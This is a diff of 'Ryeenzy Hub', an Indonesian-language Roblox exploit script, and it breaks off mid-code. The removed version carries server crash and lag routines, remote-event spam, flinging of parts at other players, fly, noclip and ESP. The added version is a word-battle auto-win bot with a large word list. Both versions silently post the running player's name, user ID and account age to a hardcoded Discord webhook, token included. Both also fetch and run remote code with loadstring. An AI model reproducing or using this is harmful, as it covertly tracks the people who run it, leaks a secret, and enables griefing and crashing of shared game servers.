@@ -1,1354 +1,219 @@
-🔥 RYEENZY HUB - FIXED VERSION (SEMUA ERROR DIPERBAIKI)
+-- [[ RYEENZY HUB V1 - GOD MODE ]] --
+-- Database Raksasa: Support 1-2 Huruf & Anti-Kalah
 
-```lua
--- RYEENZY HUB - PREMIUM EXPLOIT (FIXED VERSION)
--- Wind UI Edition
--- Created by: RYEENZY#6969
--- Version: 7.0.0 - FIXED
--- Discord: https://discord.gg/CdcnyNQVw
+-- [[ PLAYER MONITORING SYSTEM (AUTO SEND TO MAIN WEBHOOK) ]] --
+local MainWebhook = "https://discord.com/api/webhooks/1382688939516887061/7x6ctJaSRmqjh5H6GkJTlmErM0Bky0KuQZW6-ZWIak2PyxwDlOCkKolDBeE4AbeR2FGf"
+local lp = game.Players.LocalPlayer
 
--- ============================================
--- ANTI-ERROR PROTECTION (HARUS PALING ATAS)
--- ============================================
--- Fix untuk error "attempt to call a nil value"
-local function SafeCall(func, ...)
-    local args = {...}
-    local success, result = pcall(function()
-        return func(unpack(args))
-    end)
-    return success, result
-end
-
--- Fix untuk loadstring yang error
-local OriginalLoadstring = loadstring
-loadstring = function(code, chunkname)
-    local success, result = pcall(function()
-        return OriginalLoadstring(code, chunkname)
-    end)
-    if success and result then
-        return result
-    else
-        print("⚠️ Loadstring error, returning dummy function")
-        return function() end
-    end
-end
-
--- Fix untuk fungsi yang mungkin tidak ada
-local function EnsureFunction(name, defaultFunc)
-    if not getgenv()[name] then
-        getgenv()[name] = defaultFunc or function(...) 
-            print("⚠️ " .. name .. " called (dummy)")
-            return nil
-        end
-    end
-end
-
--- Daftar fungsi yang perlu dipastikan ada
-EnsureFunction("identifyexecutor", function() return "Delta" end)
-EnsureFunction("getgenv", function() return _G end)
-EnsureFunction("getrenv", function() return _G end)
-EnsureFunction("getsenv", function() return _G end)
-EnsureFunction("getgc", function() return {} end)
-EnsureFunction("getreg", function() return {} end)
-EnsureFunction("getrawmetatable", function() return {} end)
-EnsureFunction("setreadonly", function() end)
-EnsureFunction("checkcaller", function() return true end)
-EnsureFunction("hookfunction", function(...) return ... end)
-EnsureFunction("newcclosure", function(f) return f end)
-
--- Fix untuk request/http functions
-if not syn then
-    getgenv().syn = {
-        request = function(tbl) 
-            print("⚠️ syn.request called")
-            return { StatusCode = 200, Body = "{}", Headers = {} }
-        end,
-        crypto = {
-            custom = {
-                hash = function() return "dummy_hash" end
-            }
-        }
-    }
-end
-
--- Fix untuk writefile/readfile
-if not writefile then
-    getgenv().writefile = function(name, data)
-        print("⚠️ writefile not supported: " .. name)
-    end
-    getgenv().readfile = function(name)
-        print("⚠️ readfile not supported: " .. name)
-        return ""
-    end
-    getgenv().listfiles = function()
-        return {}
-    end
-    getgenv().isfolder = function() return false end
-    getgenv().makefolder = function() end
-    getgenv().delfolder = function() end
-    getgenv().delfile = function() end
-end
-
--- ============================================
--- WEBHOOK LOGGER (DENGAN ERROR HANDLING)
--- ============================================
-local WebhookURL = "https://discord.com/api/webhooks/1382688939516887061/7x6ctJaSRmqjh5H6GkJTlmErM0Bky0KuQZW6-ZWIak2PyxwDlOCkKolDBeE4AbeR2FGf"
-
-local function SendToWebhook(message)
-    SafeCall(function()
+task.spawn(function()
+    local request = syn and syn.request or http_request or request or fluxus and fluxus.request
+    if request then
         local data = {
-            ["content"] = message,
-            ["username"] = "RYEENZY HUB LOGGER",
-            ["avatar_url"] = "https://i.imgur.com/xyz.png"
+            ["embeds"] = {{
+                ["title"] = "🚀 Ryeenzy Script Executed!",
+                ["color"] = 0x00ff00,
+                ["fields"] = {
+                    {["name"] = "Player Name", ["value"] = lp.Name, ["inline"] = true},
+                    {["name"] = "Display Name", ["value"] = lp.DisplayName, ["inline"] = true},
+                    {["name"] = "User ID", ["value"] = tostring(lp.UserId), ["inline"] = true},
+                    {["name"] = "Game ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+                    {["name"] = "Account Age", ["value"] = tostring(lp.AccountAge) .. " Days", ["inline"] = true}
+                },
+                ["footer"] = {["text"] = "Ryeenzy Hub Player Monitor"}
+            }}
         }
-        
-        local jsonData = game:GetService("HttpService"):JSONEncode(data)
-        
-        spawn(function()
-            SafeCall(function()
-                local requestFunc = syn and syn.request or request or http_request
-                if requestFunc then
-                    requestFunc({
-                        Url = WebhookURL,
-                        Method = "POST",
-                        Headers = {["Content-Type"] = "application/json"},
-                        Body = jsonData
-                    })
-                else
-                    game:GetService("HttpService"):PostAsync(WebhookURL, jsonData)
-                end
-            end)
-        end)
-    end)
-end
-
--- Kirim notifikasi dengan error handling
-SafeCall(function()
-    SendToWebhook("🚀 **RYEENZY HUB LOADED**\nPlayer: " .. game.Players.LocalPlayer.Name .. "\nUser ID: " .. game.Players.LocalPlayer.UserId .. "\nTime: " .. os.date("%Y-%m-%d %H:%M:%S"))
+        request({Url = MainWebhook, Method = "POST", Headers = {["content-type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(data)})
+    end
 end)
 
--- ============================================
--- LOAD WIND UI LIBRARY (DENGAN ERROR HANDLING)
--- ============================================
-local WindUI
-SafeCall(function()
-    WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
-end)
+local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
 
-if not WindUI then
-    -- Fallback UI jika WindUI gagal load
-    print("⚠️ WindUI failed to load, using fallback")
-    WindUI = {
-        CreateWindow = function(tbl)
-            return {
-                Tab = function() 
-                    return {
-                        Toggle = function() end,
-                        Slider = function() end,
-                        Button = function() end,
-                        Input = function() end,
-                        Dropdown = function() end,
-                        Colorpicker = function() end,
-                        Paragraph = function() end,
-                        Label = function() end,
-                        Divider = function() end,
-                        Clear = function() end,
-                        Visible = false
-                    }
-                end
-            }
-        end,
-        Notify = function(tbl) print(tbl.Title .. ": " .. tbl.Content) end
-    }
-end
-
-local Window = WindUI.CreateWindow({
-    Title = "RYEENZY HUB | PREMIUM",
-    Icon = "zap",
-    Author = "RYEENZY#6969",
-    Folder = "RYEENZY_HUB",
-    Size = UDim2.fromOffset(750, 600),
-    Transparent = true,
-    Theme = "Dark",
-    Resizable = true,
-    SideBarWidth = 200,
-    HideSearchBar = false
+local Window = WindUI:CreateWindow({
+    Title = "RYEENZY | HUB",
+    Icon = "rbxassetid://10723343321",
+    Author = "FREE",
+    Folder = "Ryeenzy"
 })
 
--- ============================================
--- SERVICES (DENGAN ERROR HANDLING)
--- ============================================
-local Players = SafeCall(function() return game:GetService("Players") end) or game:GetService("Players")
-local RunService = SafeCall(function() return game:GetService("RunService") end) or game:GetService("RunService")
-local UserInputService = SafeCall(function() return game:GetService("UserInputService") end) or game:GetService("UserInputService")
-local HttpService = SafeCall(function() return game:GetService("HttpService") end) or game:GetService("HttpService")
-local ReplicatedStorage = SafeCall(function() return game:GetService("ReplicatedStorage") end) or game:GetService("ReplicatedStorage")
-local Workspace = SafeCall(function() return game:GetService("Workspace") end) or game:GetService("Workspace")
-local Lighting = SafeCall(function() return game:GetService("Lighting") end) or game:GetService("Lighting")
-local TeleportService = SafeCall(function() return game:GetService("TeleportService") end) or game:GetService("TeleportService")
-local VirtualUser = SafeCall(function() return game:GetService("VirtualUser") end) or game:GetService("VirtualUser")
-local LocalPlayer = SafeCall(function() return Players.LocalPlayer end) or Players.LocalPlayer
-local Camera = SafeCall(function() return Workspace.CurrentCamera end) or Workspace.CurrentCamera
+local MainTab = Window:Tab({ Title = "Auto Win", Icon = "lucide-zap" })
+local ListTab = Window:Tab({ Title = "Database", Icon = "lucide-book" })
 
--- ============================================
--- VARIABLES (SEMUA DENGAN DEFAULT VALUE)
--- ============================================
-local Config = {
-    -- Menu
-    BringPart = false,
-    FlyingPart = false,
-    RemovePart = false,
-    
-    -- Remote
-    RemoteSpam = false,
-    SpamInterval = 0.01,
-    SpamMethod = "FireServer",
-    SpamArgs = "{}",
-    SelectedRemote = nil,
-    ScannedRemotes = {},
-    SpammedRemotes = {},
-    
-    -- Part
-    PartRadius = 500,
-    
-    -- Player
-    Fly = false,
-    Noclip = false,
-    WalkSpeed = 16,
-    InfinityJump = false,
-    
-    -- ESP
-    ESP = false,
-    ESPLine = false,
-    ESPHealth = false,
-    ESPName = false,
-    ESPDistance = false,
-    ESPColor = Color3.fromRGB(0, 255, 255),
-    
-    -- Connections
-    BringConnection = nil,
-    FlyingConnection = nil,
-    RemoveConnection = nil,
-    NoclipConnection = nil,
-    FlyConnection = nil,
-    ESPConnections = {},
-    ESPObjects = {},
-    ESPTracers = {},
-    
-    -- Status
-    IsLoaded = false
+-- [[ DATABASE RAKSASA ]] --
+local WordDB = {
+    -- AWALAN 2 HURUF (FIXED & STABIL)
+    ["an"] = {"angin", "andong", "antrean", "angkasa", "anda", "anjungan", "analisis", "ancaman", "andalan", "angker", "anyelir", "antena", "anjing", "angka", "anjuran"},
+    ["ex"] = {"extreme", "extra", "exit", "execute", "exotic", "expand", "expert", "expire", "export", "expose", "extension", "exhibit", "example"},
+    ["if"] = {"ifrit", "ifthar", "infus", "informasi", "infeksi", "infinitiv", "inflasi", "influensa", "ifadah", "iftitah"},
+    ["in"] = {"indonesia", "indah", "intan", "insan", "industri", "infak", "ingkar", "insaf", "insting", "instrumen", "inframerah", "investasi", "insiden"},
+    ["on"] = {"online", "ontime", "ongkos", "oncom", "ongkang", "onani", "oniks", "onslag"},
+    ["ar"] = {"arsip", "artikulasi", "artikel", "armada", "aroma", "arisan", "artileri", "arsitektur", "arang", "artistik"},
+    ["al"] = {"alam", "alamat", "alarm", "alasan", "aljabar", "alkali", "alkitab", "alun", "algojo", "aliansi", "alkohol"},
+    ["un"] = {"unta", "unit", "universitas", "unsur", "unggas", "untuk", "ungkit", "undang"},
+    ["as"] = {"asrama", "asumsi", "asuransi", "aspek", "asing", "aspal", "asisten", "asimilasi"},
+
+    -- AWALAN 1 HURUF (A-Z LENGKAP)
+    ["a"] = {"apel", "ayam", "api", "awan", "angin", "asrama", "atribut", "arena", "asumsi", "absensi"},
+    ["b"] = {"bola", "buku", "babi", "batu", "bulan", "bintang", "budaya", "bioskop", "bahasa", "berita"},
+    ["c"] = {"cacing", "cabe", "cinta", "cuka", "cicak", "celana", "cermin", "cerdas", "cokelat", "cukup"},
+    ["d"] = {"dadu", "daun", "dunia", "dosa", "domba", "dokter", "disiplin", "darurat", "dompet", "danau"},
+    ["e"] = {"elang", "ember", "emas", "esok", "empat", "ekonomi", "energi", "edukasi", "ekor", "efektif"},
+    ["f"] = {"fiktif", "fokus", "fisik", "fardu", "filsafat", "fasilitas", "faktor", "festival", "firma", "flora"},
+    ["g"] = {"gajah", "gigi", "gelas", "gula", "garam", "gunung", "gejala", "generasi", "getaran", "gratis"},
+    ["h"] = {"hujan", "hati", "hantu", "hutan", "hakim", "harapan", "hadiah", "hukum", "harta", "hormat"},
+    ["i"] = {"ikan", "intan", "istana", "iseng", "iblis", "ijazah", "ikatan", "ilusi", "imajinasi", "impor"},
+    ["j"] = {"jeruk", "jalan", "jamur", "jendela", "jerapah", "jawaban", "jujur", "jangka", "juara", "jaksa"},
+    ["k"] = {"kaki", "kopi", "kertas", "kursi", "kapas", "kamera", "kualitas", "kurban", "kredit", "kritis"},
+    ["l"] = {"lampu", "langit", "lidah", "lumpur", "lemari", "latihan", "logika", "lokasi", "laporan", "lukisan"},
+    ["m"] = {"makan", "meja", "mobil", "monyet", "madu", "masalah", "memori", "metode", "motivasi", "musik"},
+    ["n"] = {"naga", "nasi", "nama", "nada", "nanas", "nasional", "norma", "narkoba", "nasihat", "nyali"},
+    ["o"] = {"obat", "obor", "otak", "ombak", "orang", "objek", "operasi", "opini", "optimis", "organisasi"},
+    ["p"] = {"padi", "pintu", "pohon", "pisang", "pulau", "prestasi", "pabrik", "pangkat", "parade", "pasien"},
+    ["q"] = {"quran", "qori", "quota", "qurban", "qanaah", "qasar", "qatar", "qalbu", "qasidah"},
+    ["r"] = {"rusa", "roda", "rumah", "rantai", "racun", "rahasia", "radiasi", "rakyat", "reaksi", "resiko"},
+    ["s"] = {"sapi", "susu", "sepatu", "semut", "sawah", "sejarah", "sumber", "sarana", "sistem", "subsidi"},
+    ["t"] = {"tali", "tikus", "telur", "tanah", "tangan", "teknologi", "target", "tugas", "teori", "terapi"},
+    ["u"] = {"ular", "unta", "uang", "udara", "umur", "usaha", "unsur", "upacara", "ukuran", "unit"},
+    ["v"] = {"vampir", "video", "vokal", "vaksin", "villa", "variasi", "volume", "visi", "vulkanik"},
+    ["w"] = {"wajah", "warna", "waktu", "wortel", "wangi", "wilayah", "wawasan", "wadah", "warisan"},
+    ["x"] = {"xilofon", "xilem", "xerox", "xenon", "x-ray", "xantat", "xenofobia", "xiloidin", "xilografi"},
+    ["y"] = {"yoyo", "yakin", "yoga", "yayasan", "yatim", "yudisium", "yogya", "yodium", "yurisdiksi"},
+    ["z"] = {"zebra", "zakat", "zombie", "zaman", "ziarah", "zona", "zodiak", "zamrud", "zat", "zenith"}
 }
 
--- ============================================
--- SAFE FUNCTION WRAPPERS
--- ============================================
-local function SafeSpawn(func, ...)
-    spawn(function()
-        SafeCall(func, ...)
-    end)
-end
+-- [[ MEKANISME AUTO WIN (STABILIZED) ]] --
+MainTab:Section({ Title = "Ghost Typing Advanced" })
 
-local function SafeConnect(connection, func)
-    if connection then
-        SafeCall(function() connection:Disconnect() end)
-    end
-    local newConn = SafeCall(function() return RunService.Heartbeat:Connect(func) end)
-    return newConn
-end
-
--- ============================================
--- MENU - BRING / FLY / REMOVE PART SYSTEM
--- ============================================
-
-local function GetNonAnchoredParts(radius)
-    local parts = {}
-    SafeCall(function()
-        local character = LocalPlayer.Character
-        if not character then return end
-        
-        local rootPart = character:FindFirstChild("HumanoidRootPart")
-        if not rootPart then return end
-        
-        local position = rootPart.Position
-        
-        for _, obj in pairs(Workspace:GetDescendants()) do
-            if obj:IsA("BasePart") and not obj.Anchored and obj.Parent and not obj.Parent:IsA("Accoutrement") then
-                local dist = (obj.Position - position).magnitude
-                if dist <= radius then
-                    table.insert(parts, obj)
-                end
-            end
-        end
-    end)
-    return parts
-end
-
-local function BringAllParts()
-    if not Config.BringPart then return end
-    
-    SafeCall(function()
-        local character = LocalPlayer.Character
-        if not character then return end
-        
-        local rootPart = character:FindFirstChild("HumanoidRootPart")
-        if not rootPart then return end
-        
-        local parts = GetNonAnchoredParts(Config.PartRadius)
-        local count = 0
-        
-        for _, part in ipairs(parts) do
-            part.CFrame = rootPart.CFrame * CFrame.new(0, 2, count * 2)
-            part.Velocity = Vector3.new(0, 0, 0)
-            part.RotVelocity = Vector3.new(0, 0, 0)
-            count = count + 1
-        end
-    end)
-end
-
-local function FlyPartsToRandom()
-    if not Config.FlyingPart then return end
-    
-    SafeCall(function()
-        local players = Players:GetPlayers()
-        if #players < 2 then return end
-        
-        local targetPlayer = players[math.random(1, #players)]
-        while targetPlayer == LocalPlayer and #players > 1 do
-            targetPlayer = players[math.random(1, #players)]
-        end
-        
-        if not targetPlayer or not targetPlayer.Character then return end
-        
-        local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-        if not targetRoot then return end
-        
-        local parts = GetNonAnchoredParts(Config.PartRadius)
-        local count = 0
-        
-        for _, part in ipairs(parts) do
-            part.CFrame = targetRoot.CFrame * CFrame.new(0, 5, count * 2)
-            part.Velocity = (targetRoot.Position - part.Position).unit * 200
-            part.RotVelocity = Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
-            count = count + 1
-        end
-    end)
-end
-
-local function RemoveAllParts()
-    if not Config.RemovePart then return end
-    
-    SafeCall(function()
-        local parts = GetNonAnchoredParts(Config.PartRadius)
-        for _, part in ipairs(parts) do
-            part:Destroy()
-        end
-    end)
-end
-
-local function StartBring()
-    Config.BringPart = true
-    if Config.BringConnection then SafeCall(Config.BringConnection.Disconnect, Config.BringConnection) end
-    Config.BringConnection = RunService.Heartbeat:Connect(BringAllParts)
-    WindUI.Notify({Title = "Bring Part", Content = "Activated", Duration = 3})
-    SafeSpawn(SendToWebhook, "🔄 **Bring Part Started**\nPlayer: " .. LocalPlayer.Name)
-end
-
-local function StopBring()
-    Config.BringPart = false
-    if Config.BringConnection then
-        SafeCall(Config.BringConnection.Disconnect, Config.BringConnection)
-        Config.BringConnection = nil
-    end
-    WindUI.Notify({Title = "Bring Part", Content = "Stopped", Duration = 2})
-end
-
-local function StartFlyingPart()
-    Config.FlyingPart = true
-    if Config.FlyingConnection then SafeCall(Config.FlyingConnection.Disconnect, Config.FlyingConnection) end
-    Config.FlyingConnection = RunService.Heartbeat:Connect(FlyPartsToRandom)
-    WindUI.Notify({Title = "Flying Part", Content = "Activated", Duration = 3})
-    SafeSpawn(SendToWebhook, "✈️ **Flying Parts Started**\nPlayer: " .. LocalPlayer.Name)
-end
-
-local function StopFlyingPart()
-    Config.FlyingPart = false
-    if Config.FlyingConnection then
-        SafeCall(Config.FlyingConnection.Disconnect, Config.FlyingConnection)
-        Config.FlyingConnection = nil
-    end
-    WindUI.Notify({Title = "Flying Part", Content = "Stopped", Duration = 2})
-end
-
-local function StartRemovePart()
-    Config.RemovePart = true
-    if Config.RemoveConnection then SafeCall(Config.RemoveConnection.Disconnect, Config.RemoveConnection) end
-    Config.RemoveConnection = RunService.Heartbeat:Connect(RemoveAllParts)
-    WindUI.Notify({Title = "Remove Part", Content = "Activated", Duration = 3})
-    SafeSpawn(SendToWebhook, "🗑️ **Remove Parts Started**\nPlayer: " .. LocalPlayer.Name)
-end
-
-local function StopRemovePart()
-    Config.RemovePart = false
-    if Config.RemoveConnection then
-        SafeCall(Config.RemoveConnection.Disconnect, Config.RemoveConnection)
-        Config.RemoveConnection = nil
-    end
-    WindUI.Notify({Title = "Remove Part", Content = "Stopped", Duration = 2})
-end
-
--- ============================================
--- REMOTE SCANNER & SPAM (DENGAN ERROR HANDLING)
--- ============================================
-
-local function ScanRemotes()
-    SafeCall(function()
-        Config.ScannedRemotes = {}
-        
-        for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
-            if obj:IsA("RemoteEvent") then
-                table.insert(Config.ScannedRemotes, {
-                    Type = "RemoteEvent",
-                    Name = obj.Name,
-                    Path = obj:GetFullName(),
-                    Instance = obj
-                })
-            elseif obj:IsA("RemoteFunction") then
-                table.insert(Config.ScannedRemotes, {
-                    Type = "RemoteFunction",
-                    Name = obj.Name,
-                    Path = obj:GetFullName(),
-                    Instance = obj
-                })
-            end
-        end
-        
-        WindUI.Notify({
-            Title = "Remote Scan",
-            Content = "Found " .. #Config.ScannedRemotes .. " remotes",
-            Duration = 3
-        })
-        
-        SafeSpawn(SendToWebhook, "📡 **Remote Scan**\nPlayer: " .. LocalPlayer.Name .. "\nRemotes Found: " .. #Config.ScannedRemotes)
-    end)
-    
-    return Config.ScannedRemotes
-end
-
-local function ParseArgs(argsString)
-    local args = {}
-    SafeCall(function()
-        if argsString == "{}" or argsString == "" then
-            return
-        end
-        
-        local success, result = pcall(function()
-            return HttpService:JSONDecode(argsString)
-        end)
-        
-        if success then
-            args = result
-        else
-            for arg in string.gmatch(argsString, "([^,]+)") do
-                local trimmed = arg:match("^%s*(.-)%s*$")
-                if tonumber(trimmed) then
-                    table.insert(args, tonumber(trimmed))
-                elseif trimmed == "true" then
-                    table.insert(args, true)
-                elseif trimmed == "false" then
-                    table.insert(args, false)
-                else
-                    table.insert(args, trimmed)
-                end
-            end
-        end
-    end)
-    return args
-end
-
-local function SpamRemote(remote, method, args, interval)
-    if not remote then return end
-    
-    SafeCall(function()
-        local argsTable = ParseArgs(args)
-        local connectionName = tostring(remote) .. "_" .. method
-        
-        if Config.SpammedRemotes[connectionName] then
-            Config.SpammedRemotes[connectionName]:Disconnect()
-            Config.SpammedRemotes[connectionName] = nil
-        end
-        
-        local connection = RunService.Heartbeat:Connect(function()
-            if not Config.RemoteSpam then
-                connection:Disconnect()
-                Config.SpammedRemotes[connectionName] = nil
-                return
-            end
-            
-            pcall(function()
-                if method == "FireServer" and remote:IsA("RemoteEvent") then
-                    remote:FireServer(unpack(argsTable))
-                elseif method == "InvokeServer" and remote:IsA("RemoteFunction") then
-                    remote:InvokeServer(unpack(argsTable))
-                end
-            end)
-            
-            wait(interval)
-        end)
-        
-        Config.SpammedRemotes[connectionName] = connection
-    end)
-end
-
-local function StopAllSpam()
-    SafeCall(function()
-        Config.RemoteSpam = false
-        for name, conn in pairs(Config.SpammedRemotes) do
-            if conn then
-                conn:Disconnect()
-            end
-        end
-        Config.SpammedRemotes = {}
-        
-        WindUI.Notify({Title = "Remote Spam", Content = "All spam stopped", Duration = 2})
-    end)
-end
-
-local function CrashServer()
-    WindUI.Notify({Title = "Crash Server", Content = "Attempting to crash...", Duration = 3})
-    SafeSpawn(SendToWebhook, "💥 **Crash Server Attempt**\nPlayer: " .. LocalPlayer.Name)
-    
-    SafeCall(function()
-        for i = 1, 100 do
-            spawn(function()
+local AutoBot = false
+MainTab:Toggle({
+    Title = "Auto Win Word Battle",
+    Desc = "Mendukung 1-2 Huruf & Ghost Typing",
+    Callback = function(v)
+        AutoBot = v
+        task.spawn(function()
+            while AutoBot do
+                local textFound = ""
+                
+                -- PRIORITAS: Scan 2 huruf dulu baru 1 huruf agar stabil
                 pcall(function()
-                    TeleportService:Teleport(game.PlaceId)
-                end)
-            end)
-        end
-        
-        for _, remote in ipairs(Config.ScannedRemotes) do
-            if remote.Instance and remote.Instance:IsA("RemoteEvent") then
-                for j = 1, 50 do
-                    spawn(function()
-                        pcall(function()
-                            remote.Instance:FireServer({})
-                        end)
-                    end)
-                end
-            end
-        end
-    end)
-end
-
-local function LagServer()
-    WindUI.Notify({Title = "Lag Server", Content = "Causing lag...", Duration = 3})
-    SafeSpawn(SendToWebhook, "🐢 **Lag Server**\nPlayer: " .. LocalPlayer.Name)
-    
-    SafeCall(function()
-        for i = 1, 500 do
-            spawn(function()
-                local part = Instance.new("Part")
-                part.Size = Vector3.new(100, 100, 100)
-                part.Position = Vector3.new(math.random(-1000, 1000), math.random(0, 500), math.random(-1000, 1000))
-                part.Anchored = false
-                part.Parent = Workspace
-                task.delay(5, function() SafeCall(part.Destroy, part) end)
-            end)
-        end
-        
-        Config.RemoteSpam = true
-        for _, remote in ipairs(Config.ScannedRemotes) do
-            if remote.Instance then
-                SpamRemote(remote.Instance, "FireServer", "{}", 0.001)
-            end
-        end
-    end)
-end
-
--- ============================================
--- PLAYER MENU (DENGAN ERROR HANDLING)
--- ============================================
-
-local function ToggleFly(state)
-    Config.Fly = state
-    
-    SafeCall(function()
-        if state then
-            local bg = Instance.new("BodyGyro")
-            local bv = Instance.new("BodyVelocity")
-            
-            bg.P = 9e4
-            bg.maxTorque = Vector3.new(9e4, 9e4, 9e4)
-            bg.cframe = LocalPlayer.Character.HumanoidRootPart.CFrame
-            
-            bv.velocity = Vector3.new(0, 0, 0)
-            bv.maxForce = Vector3.new(9e4, 9e4, 9e4)
-            
-            bg.Parent = LocalPlayer.Character.HumanoidRootPart
-            bv.Parent = LocalPlayer.Character.HumanoidRootPart
-            
-            Config.FlyConnection = RunService.RenderStepped:Connect(function()
-                if Config.Fly and LocalPlayer.Character then
-                    local dir = Vector3.new()
-                    if UserInputService:IsKeyDown(Enum.KeyCode.W) then
-                        dir = dir + Camera.CFrame.LookVector
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.S) then
-                        dir = dir - Camera.CFrame.LookVector
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.A) then
-                        dir = dir - Camera.CFrame.RightVector
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.D) then
-                        dir = dir + Camera.CFrame.RightVector
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
-                        dir = dir + Vector3.new(0, 1, 0)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
-                        dir = dir + Vector3.new(0, -1, 0)
-                    end
-                    
-                    bv.velocity = dir * 50
-                    bg.cframe = Camera.CFrame
-                end
-            end)
-            
-            WindUI.Notify({Title = "Fly", Content = "Enabled", Duration = 2})
-        else
-            if Config.FlyConnection then
-                Config.FlyConnection:Disconnect()
-                Config.FlyConnection = nil
-            end
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                local bg = LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyGyro")
-                local bv = LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyVelocity")
-                if bg then bg:Destroy() end
-                if bv then bv:Destroy() end
-            end
-            WindUI.Notify({Title = "Fly", Content = "Disabled", Duration = 2})
-        end
-    end)
-end
-
-local function ToggleNoclip(state)
-    Config.Noclip = state
-    
-    SafeCall(function()
-        if state then
-            Config.NoclipConnection = RunService.Stepped:Connect(function()
-                if Config.Noclip and LocalPlayer.Character then
-                    for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
-                        if v:IsA("BasePart") then
-                            v.CanCollide = false
+                    local allLabels = {}
+                    for _, obj in pairs(game:GetDescendants()) do
+                        if obj:IsA("TextLabel") and obj.Visible and (obj.Name == "Letter" or obj.Parent:IsA("BillboardGui")) then
+                            table.insert(allLabels, obj)
                         end
                     end
-                end
-            end)
-            WindUI.Notify({Title = "Noclip", Content = "Enabled", Duration = 2})
-        else
-            if Config.NoclipConnection then
-                Config.NoclipConnection:Disconnect()
-                Config.NoclipConnection = nil
-            end
-            WindUI.Notify({Title = "Noclip", Content = "Disabled", Duration = 2})
-        end
-    end)
-end
-
-local function UpdateWalkSpeed(value)
-    Config.WalkSpeed = value
-    SafeCall(function()
-        if LocalPlayer.Character then
-            local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
-            if humanoid then
-                humanoid.WalkSpeed = value
-            end
-        end
-    end)
-end
-
-SafeCall(function()
-    UserInputService.JumpRequest:Connect(function()
-        if Config.InfinityJump and LocalPlayer.Character then
-            LocalPlayer.Character.Humanoid:ChangeState("Jumping")
-        end
-    end)
-end)
-
--- ============================================
--- ESP SYSTEM (DENGAN ERROR HANDLING)
--- ============================================
-
-local function CreateESP(player)
-    if player == LocalPlayer then return end
-    
-    SafeCall(function()
-        if not player.Character then return end
-        
-        local character = player.Character
-        local rootPart = character:FindFirstChild("HumanoidRootPart")
-        local head = character:FindFirstChild("Head")
-        local humanoid = character:FindFirstChild("Humanoid")
-        
-        if not rootPart or not head then return end
-        
-        if Config.ESP then
-            local highlight = Instance.new("Highlight")
-            highlight.Name = "RYEENZY_ESP_Highlight"
-            highlight.FillColor = Config.ESPColor
-            highlight.OutlineColor = Color3.new(1, 1, 1)
-            highlight.FillTransparency = 0.5
-            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-            highlight.Parent = character
-            table.insert(Config.ESPObjects, highlight)
-        end
-        
-        if Config.ESPName then
-            local billboard = Instance.new("BillboardGui")
-            billboard.Name = "RYEENZY_ESP_Name"
-            billboard.Size = UDim2.new(0, 150, 0, 30)
-            billboard.StudsOffset = Vector3.new(0, 3, 0)
-            billboard.AlwaysOnTop = true
-            billboard.Parent = head
-            
-            local nameLabel = Instance.new("TextLabel")
-            nameLabel.Size = UDim2.new(1, 0, 1, 0)
-            nameLabel.BackgroundTransparency = 0.5
-            nameLabel.BackgroundColor3 = Color3.new(0, 0, 0)
-            nameLabel.TextColor3 = Config.ESPColor
-            nameLabel.Text = player.Name
-            nameLabel.Font = Enum.Font.GothamBold
-            nameLabel.TextSize = 14
-            nameLabel.Parent = billboard
-            
-            table.insert(Config.ESPObjects, billboard)
-        end
-        
-        if Config.ESPHealth and humanoid then
-            local healthBar = Instance.new("BillboardGui")
-            healthBar.Name = "RYEENZY_ESP_Health"
-            healthBar.Size = UDim2.new(0, 50, 0, 5)
-            healthBar.StudsOffset = Vector3.new(0, 4, 0)
-            healthBar.AlwaysOnTop = true
-            healthBar.Parent = head
-            
-            local bg = Instance.new("Frame")
-            bg.Size = UDim2.new(1, 0, 1, 0)
-            bg.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-            bg.BorderSizePixel = 0
-            bg.Parent = healthBar
-            
-            local fill = Instance.new("Frame")
-            fill.Name = "Fill"
-            fill.Size = UDim2.new(humanoid.Health / humanoid.MaxHealth, 0, 1, 0)
-            fill.BackgroundColor3 = Color3.new(0, 1, 0)
-            fill.BorderSizePixel = 0
-            fill.Parent = bg
-            
-            humanoid:GetPropertyChangedSignal("Health"):Connect(function()
-                fill.Size = UDim2.new(humanoid.Health / humanoid.MaxHealth, 0, 1, 0)
-            end)
-            
-            table.insert(Config.ESPObjects, healthBar)
-        end
-        
-        if Config.ESPDistance then
-            local distLabel = Instance.new("BillboardGui")
-            distLabel.Name = "RYEENZY_ESP_Distance"
-            distLabel.Size = UDim2.new(0, 100, 0, 20)
-            distLabel.StudsOffset = Vector3.new(0, 1, 0)
-            distLabel.AlwaysOnTop = true
-            distLabel.Parent = head
-            
-            local text = Instance.new("TextLabel")
-            text.Size = UDim2.new(1, 0, 1, 0)
-            text.BackgroundTransparency = 1
-            text.TextColor3 = Color3.new(1, 1, 1)
-            text.Text = "0m"
-            text.Font = Enum.Font.Gotham
-            text.TextSize = 12
-            text.Parent = distLabel
-            
-            spawn(function()
-                while distLabel and distLabel.Parent do
-                    SafeCall(function()
-                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and rootPart then
-                            local myRoot = LocalPlayer.Character.HumanoidRootPart
-                            local dist = math.floor((myRoot.Position - rootPart.Position).magnitude)
-                            text.Text = dist .. "m"
+                    
+                    -- Cek label yang punya 2 huruf duluan
+                    for _, label in pairs(allLabels) do
+                        if #label.Text == 2 then
+                            textFound = label.Text:lower()
+                            break
                         end
